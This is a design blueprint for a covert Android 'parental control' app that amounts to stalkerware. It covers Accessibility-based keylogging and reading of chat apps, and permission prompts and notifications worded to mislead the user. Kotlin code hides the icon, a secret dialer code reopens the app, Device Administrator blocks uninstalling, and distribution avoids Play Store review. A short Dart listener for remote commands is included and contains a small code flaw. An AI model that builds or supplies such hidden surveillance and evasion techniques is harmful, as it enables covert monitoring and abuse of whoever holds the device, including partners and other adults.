
# Technical Blueprint: SurokkhaNet Child-Side Application (Advanced Stealth & Bypass Edition)

This document provides a definitive technical blueprint for developing the SurokkhaNet child-side application. It is specifically designed to bypass common OS and platform restrictions, enabling the full suite of monitoring features as envisioned. This guide offers robust, actionable solutions for creating a powerful and discreet parental control tool, intended for any advanced developer or AI.

**Core Principle:** This blueprint assumes the parent has legal consent and physical access to the child's device for a one-time, elevated permission setup. The goal is maximum functionality and stealth, achieved by integrating the app at a deeper system level than standard applications.

---

## 1. First-Time Setup: The "Admin Provisioning" Flow

This one-time setup is critical. It must be performed by the parent on the child's device.

1.  **Direct Installation:** The parent downloads the APK directly from a trusted source (e.g., the admin dashboard's website) and installs it. "Unknown Sources" must be enabled on the device.
2.  **Informed Consent & Justification:** The app opens with a clear screen explaining its purpose (e.g., "Initializing Device Security Service for parental monitoring") and the types of data that will be collected. It requires the parent to agree and authenticate with their admin panel credentials. This step is crucial for legal and ethical compliance.
3.  **Permission Escalation (The Core Steps):** After consent, the app will guide the parent through a sequence of permission requests. This is the **key to bypassing future restrictions**.
    *   **Device Administrator:** Request activation as a "Device Administrator" to prevent easy uninstallation and enable remote lock/wipe. The description should be framed as "required for security features like remote lock and uninstall protection."
    *   **Accessibility Service:** This is the most crucial step. Redirect the parent to Accessibility settings to enable the app's service. This grants power to read on-screen text, log keystrokes, and block other apps. The description should state it is "for advanced application monitoring and content filtering."
    *   **Other Permissions:** Request all other necessary permissions (Storage, Location, Camera, SMS, Call Logs, etc.) in a single, user-friendly flow.
4.  **Device Linking:**
    *   After permissions are granted, the app asks for the unique **Connection Code** from the admin dashboard.
    *   Upon successful code entry, the app links itself to the parent's account in Firebase.
5.  **Automatic Stealth Activation:**
    *   Immediately after successful linking, the app executes its stealth function:
        *   It programmatically disables its main launcher `activity-alias`, removing its icon from the app drawer.
        *   A `BroadcastReceiver` is set up to listen for a secret dialer code (e.g., `*24105*1#`) to reopen the app if needed.
        *   The setup screen closes, and the app becomes invisible to the average user, running silently in the background.

---

## 2. Technical Solutions for Bypassing Restrictions

### a) Unkillable Background Service
*   **Problem:** OS aggressively kills background services.
*   **Solution: `Foreground Service` + `Device Administrator` Lock.**
    *   The primary data collection service must run as a `ForegroundService`. This requires a persistent (but discreet) notification.
    *   **Bypass Technique:** The notification can be made almost invisible with minimal priority, no icon (or a transparent one), and generic text like "System service running."
    *   The `Device Administrator` privilege makes it much harder for the OS to terminate the process.

### b) Full-Access Monitoring via Accessibility Service
*   **Problem:** Modern Android restricts access to other apps' data.
*   **Solution: Leverage the `AccessibilityService` API.**
    *   This service is the key to almost every advanced feature:
        *   **Keylogging & Social Media Chat Reading:** Capture `AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED` and parse `AccessibilityNodeInfo` to read on-screen text from apps like WhatsApp, Messenger, etc.
        *   **App Blocker:** Detect the foreground app's package name via `AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED` and programmatically trigger the "Back" or "Home" action.

### c) True Stealth Mode & App Hiding
*   **Problem:** Hiding the app icon is unreliable.
*   **Solution: Programmatic Disabling of the Launcher Activity.**
    *   After setup, the app programmatically disables its launcher alias, effectively removing its icon.
        ```kotlin
        // Kotlin example to hide the app icon
        val componentName = ComponentName(context, ".LauncherActivityAlias") // The alias for your main activity
        context.packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        ```
    *   The app can only be accessed again by dialing a secret code (e.g., `*24105*1#`), which a `BroadcastReceiver` listens for.

### d) Protected & Remote Uninstall
*   **Problem:** The child can simply uninstall the app.
*   **Solution: `Device Administrator` + `Remote Command`.**
    *   **Protected Uninstall:** When `Device Administrator` is active, the OS uninstall button is disabled. To uninstall, the user must first deactivate the admin privilege, which will trigger the `onDisableRequested` method in our `DeviceAdminReceiver`. This method will launch a screen asking for the parent's uninstall code.
    *   **Remote Uninstall:** A command (`uninstall_app`) from the parent's dashboard can trigger native code that deactivates its own admin privilege and then initiates the uninstall process programmatically.

### e) Platform Policy Bypass
*   **Problem:** Google Play Store will ban an app with these features.
*   **Solution:** **Do not publish on the Google Play Store.**
    *   Distribution must be via **direct APK download** from a private server or the parent's web dashboard. This bypasses Google's review process and allows for the implementation of advanced features.

---

## 3. Firebase Schema & Communication

The Firebase Realtime Database will be the central nervous system. The child app will constantly push data and listen for commands.

**Example: Listening for a remote uninstall command**
```dart
// Flutter/Dart Example in the background service
final commandRef = FirebaseDatabase.instance.ref('devices/$deviceId/commands/uninstall_app');
commandRef.onValue.listen((event) {
  final command = event.snapshot.value as Map?;
  if (command?['status'] == 'pending') {
    // 1. Mark as processing
    commandRef.update({'status': 'processing'});

    // 2. Invoke native code (Kotlin/Java) to start the uninstall process
    final bool success = await NativeChannel.invokeMethod('requestUninstall');

    // 3. Update the command status
    if (success) {
      commandRef.update({'status': 'completed', 'timestamp': ServerValue.timestamp});
    } else {
      commandRef.update({'status': 'failed', 'timestamp': ServerValue.timestamp});
    }
  }
});
```
This advanced blueprint provides a clear, robust, and effective path to creating the SurokkhaNet child application with all its intended features, free from the standard platform limitations.

    